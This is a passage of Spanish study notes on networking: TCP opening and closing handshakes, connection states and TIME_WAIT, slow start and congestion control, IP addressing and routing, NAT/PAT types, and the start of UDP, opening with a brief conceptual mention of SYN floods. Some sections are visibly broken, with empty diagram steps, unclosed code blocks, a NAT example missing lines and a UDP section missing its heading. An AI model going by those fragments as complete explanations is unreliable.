##### Un atacante: envía muchos SYN, nunca responde al SYN-ACK; El servidor queda esperando ACKs.

##### Resultado: se llena la cola de conexiones, DoS (Denial of Service)


#### Por eso existen: SYN cookies, firewalls, rate limiting


### Modelo

TCP no empieza diciendo: “Aquí están los datos.”

##### Primero dice: ¿Podemos hablar?, ¿Podemos hablar ambos?, Ok, empecemos. Ese acuerdo es el handshake.

Rs:

```
1. SYN      → quiero conectar
2. SYN-ACK  → acepto
3. ACK      → confirmado
```

Conexión TCP creada.

## Four-Way Handshake (TCP connection close)

La otra mitad de TCP que casi nadie explica
##### Y es interesante porque cerrar una conexión es más complejo que abrirla.

##### Termina una conexión de forma ordenada y segura, asegurando que: todos los datos fueron enviados, fueron recibidos y ninguna información se pierde

Ej:

```
A: Ya terminé de hablar (FIN)
B: Ok, te escuché (ACK)
B: Yo también terminé (FIN)
A: Perfecto, cerramos (ACK)
```

##### La clave: Ambos lados deben cerrar independientemente


### Four-Way Vs. Three-Way

| Apertura              | Cierre                         |
| --------------------- | ------------------------------ |
| Simétrica             | Asimétrica                     |
| 3 pasos               | 4 pasos                        |
| Ambos empiezan juntos | Cada lado cierra cuando quiere |


#### TCP permite algo llamado: Half-Close (media conexión)

##### Un lado puede dejar de enviar datos mientras aún recibe.


Los 4 pasos:

Ej. Cliente inicia el cierre.


### 1. Fin: Cliente termina de enviar

El cliente envía: FIN

Signfica: “No enviaré más datos.”

Ej:

```
Cliente → Servidor
FIN, Seq = 3000
```

##### Solo cierra su canal de envío.


### 2. ACK: Servidor confirma

Servidor responde: ACK

Significa: “Recibí tu FIN.”

```
Servidor → Cliente
ACK = 3001
```

##### Ahora: Cliente → ya no envía datos, Servidor → aún puede enviar, Estado: conexión half-closed.


### 3. FIN - Servidor termina

Cuando el servidor acaba: FIN

```
Servidor → Cliente
FIN, Seq = 9000
```

Dice: “Yo también terminé.”


### 4. ACK - Confirmación final

Cliente responde: ACK

```
Cliente → Servidor
ACK = 9001
```

Conexión completamente cerrada

Ej:

```
Cliente                          Servidor
   | -------- FIN -------------> |
   | <------- ACK -------------- |
   |                             | (aún envía datos)
   | <------- FIN -------------- |
   | -------- ACK -------------> |
   |                             |
   | ===== CONEXIÓN CERRADA ==== |
```

   
### Motivo de los 4 pasos: TCP es full-duplex:

```
Canal A → B
Canal B → A
```

##### Son independientes: Cada dirección debe cerrarse por separado.


### Estados TCP durante el cierre: Importante, pregunta técnica

1. Lado que inicia cierre

| Estado      | Significado      |
| ----------- | ---------------- |
| ESTABLISHED | conexión activa  |
| FIN_WAIT_1  | envió FIN        |
| FIN_WAIT_2  | recibió ACK      |
| TIME_WAIT   | espera seguridad |
| CLOSED      | terminado        |

2. Lado receptor

| Estado     | Significado |
| ---------- | ----------- |
| CLOSE_WAIT | recibió FIN |
| LAST_ACK   | envió FIN   |
| CLOSED     | terminado   |


### Famoso estado TIME_WAIT

##### Después del último ACK: El cliente entra en: TIME_WAIT
Durante ~2×MSL (≈ 1–4 minutos).


#### Por qué existe TIME_WAIT?

Para evitar:

1. Paquetes retrasados: Paquetes viejos no deben confundirse con nuevas conexiones.

2. ACK perdido: Si el último ACK se pierde, el servidor puede reenviar FIN.
El cliente aún está disponible para responder.
Seguridad del protocolo.


### Problema real: muchos TIME_WAIT

##### Servidores de alto tráfico pueden tener: miles de sockets TIME_WAIT

#### Por eso existen optimizaciones:, socket reuse, keep-alive, connection pooling


### Comandos en Linux

```
ss -tan
```

Vas a encontrar:

```
TIME-WAIT
FIN-WAIT-1
CLOSE-WAIT
```
Cada uno representa una fase real del cierre TCP.


### Modelo

1. Abrir conexión:

```
¿Podemos hablar?
Sí.
Ok.
```

2. Cerrar conexión:

```
Yo terminé.
Ok.
Yo también.
Perfecto.
```

TCP nunca asume nada — todo debe confirmarse.

Rs:

1. FIN  → dejo de enviar
2. ACK  → recibido
3. FIN  → yo también termino
4. ACK  → cierre confirmado

Conexión cerrada correctamente

### Cómo TCP evita colapso Web

Uno de los conceptos más brillantes de la ingeniería de Internet.
Sin esto Internet literalmente colapsaría en minutos

TCP controla la congestión: especialmente Slow Start


#### Problema fundamental

```
Millones de computadoras
↓

↓

↓
paquetes se pierden
↓

↓

↓
colapso total
```

##### Esto ocurrió realmente en los años 80: Congestion Collapse (ARPANET). La red funcionaba peor cuanto más tráfico había.


#### Idea revolucionaria de TCP

##### TCP decidió algo inteligente: No asumir la velocidad de la red. Aprenderla dinámicamente. TCP trata a Internet como algo desconocido.

Analogía: manejo en una autopista con niebla
¿La ruta está vacía?
¿Hay tráfico?
¿Hay accidente?

##### Empieza lento → acelera → detecta problemas → desacelera.


#### Congestion Window (cwnd)

TCP mantiene una variable interna:
`cwnd = congestion window`

##### Define: cuántos datos puedo enviar SIN esperar ACK.
No depende del receptor.
Depende de la red.


Envío permitido

TCP puede enviar:
`min(cwnd, receiver_window)`


#### Slow Start: crecimiento exponencial

El nombre es engañoso: 👉 en realidad es crecimiento exponencial.


Estado inicial

Cuando empieza una conexión:
`cwnd = 1 MSS`
(MSS ≈ 1460 bytes típicamente)

TCP envía SOLO un segmento.

Proceso: 

1. 

```
Envía 1 paquete
↓
Recibe ACK
↓
cwnd = 2
```
Ahora puede enviar 2 paquetes.

2. 

```
envía 2
↓
recibe ACKs
↓
cwnd = 4
```

3.

`4 → 8 → 16 → 32 → 64 ...`

Crecimiento: 2^n, exponencial

```

RTT 2 → 2
RTT 3 → 4
RTT 4 → 8
RTT 5 → 16
RTT 6 → 32
```

En pocos milisegundos alcanza alta velocidad.

##### si la red está libre → acelera rápido, si está congestionada → lo detecta temprano


#### Detección de la congestion: TCP NO ve routers. Solo observa síntomas:

##### 1. Pérdida de paquetes: si falta un ACK: probable congestión

##### 2. ACKs duplicados: Indica paquete perdido.
ACK 1000
ACK 1000
ACK 1000

##### 3. Timeout: Peor escenario: ACK nunca llega 


#### Acción al Detectar congestion

Caso leve (duplicate ACK):

TCP piensa: “La red empieza a llenarse”.
Entonces:
`cwnd = cwnd / 2`

Reduce velocidad a la mitad.


Caso grave (timeout)
TCP asume:
congestión severa

Entonces
`cwnd = 1`
vuelve al inicio.
Reentra en Slow Start


#### Después de Slow Start: Cuando alcanza cierto umbral

`ssthresh (slow start threshold)`

Cambia a:

`+1 MSS por RTT`

Ya no es exponencial

        tiempo
```

caída ante pérdida

## IP: Internet Protocol

Sistema de direccionamiento y transporte básico de Internet

##### Protocolo encargado de llevar paquetes desde un origen hasta un destino a través de redes (Sin garantizar nada más.)

##### Con la idea de: entrega con el máximo esfuerzo; no garantiza entrega, no garantiza orden, no garantiza no duplicación. Por eso existe TCP encima


Fundamentos: IP = identidad de red

#### 1. Direccionamiento IP: Cada dispositivo en la red tiene una dirección única. IPv4 (ej. 192.168.1.1)

32 bits → ~4.3 mil millones de direcciones.

IPv6: 2001:0db8:85a3::8a2e:0370:7334
128 bits, prácticamente infinito


#### 2. Paquetes (datagramas)

IP no envía “mensajes”. Envía paquetes (datagramas IP)

Cada paquete contiene: IP origen, IP destino, datos, metadata

Ej estructura simplificada: `[HEADER IP][DATA]`


#### 3. Enrutamiento (Routing)

##### IP decide: ¿por dónde envío este paquete? Los routers: leen IP destino, consultan tabla de rutas, reenvían el paquete

##### Internet = red de routers: cada salto se llama 'hop'.


#### 4. Independencia de paquetes: cada paquete viaja por su cuenta. Puede tomar rutas distintas, llegar desordenado, perderse. Luego TCP luego reordena

```
Paquete 1 → ruta A
Paquete 2 → ruta B
Paquete 3 → perdido
```


#### 5. TTL (Time To Live): número máximo de saltos

Cada router: `TTL - 1`, si llega a 0, paquete descartado

Propósito: Evita loops infinitos en la red


#### 6. Fragmentación: MTU

Si un paquete es demasiado grande: `MTU (Maximum Transmission Unit)`

IP puede fragmentarlos porpartes.
Hoy se evita en lo posible (mejor rendimiento).


#### 7.  Best Effort (sin garantias)

##### IP no asegura: entrega, orden, integridad; solo el intento de entregarlo

| IP             | TCP               |
| -------------- | ----------------- |
| entrega básica | entrega confiable |
| sin control    | control completo  |


#### 8. Sin conexión (connectionless)

##### IP NO establece conexión. No hay handshake. Cada paquete es independiente

| TCP                  | IP           |
| -------------------- | ------------ |
| orientado a conexión | sin conexión |
| estado               | sin estado   |


#### 9. Encapsulación

IP encapsula datos de capas superiores:
`[TCP][DATA] → dentro de → [IP]`

Luego:
`[IP] → dentro de → Ethernet`

### NAT

Es una técnica que permite traducir direcciones IP privadas ↔ públicas

Uso principal: `muchos dispositivos internos → 1 sola IP pública`

#### Resuelve problema de IPv4: tiene un límite (~4.3 mil millones de IPs). Pero hay miles de millones de dispositivos

En casa:

```

Desde Internet:

`TODO parece venir de 200.x.x.x`

Ej:

##### 2. Router aplica NAT

El router cambia:

↓

##### Guarda una tabla: 192.168.1.10:54321 ↔ 200.x.x.x:60000


##### 3. Paquete sale a internet

Origen: 200.x.x.x:60000

Origen: 142.250.x.x:443

```

------------------------------------------------

#### PAT (Port Address Translation): NAT + puertos = PAT

Lo que usamos en casa NO es solo NAT.
También llamado: NAT overload, masquerading

##### Idea: IP pública + puerto = conexión única
##### Conecta con TCP (IP, puerto)


#### Tipos de NAT

##### 1. SNAT (Source NAT): Cambia la IP de origen.
el más común (salida a Internet)

##### 2. DNAT (Destination NAT): Cambia destino.
Internet → tu router → servidor interno

##### 3. Port Forwarding: Permite exponer servicios internos.
Ej: 200.x.x.x:80 → 192.168.1.100:80

##### 4. Full Cone / Symmetric NAT: Tipos avanzados (importante para gaming/WebRTC) 

Full Cone → abierto
Restricted → limitado
Symmetric → más estricto


##### Problema de NAT: rompe el modelo original de Internet: end-to-end connectivity

Antes: cualquier host → cualquier host

##### Con NAT: los hosts internos NO son accesibles directamente

##### Consecuencias: No podes hostear servidor fácilmente, recibir conexiones entrantes -> Sin port forwarding, VPN, túneles

Ej: gaming

##### Problema típico: "NAT Strict". otros jugadores no pueden conectarse a vos directamente.

No hay handshake:

A diferencia de TCP:

```
TCP → SYN → SYN-ACK → ACK

1 ida + 1 vuelta. Fin.


UDP NO garantiza: entrega, orden, duplicación, integridad completa, control de congestión

Muchas aplicaciones prefieren velocidad sobre perfección.
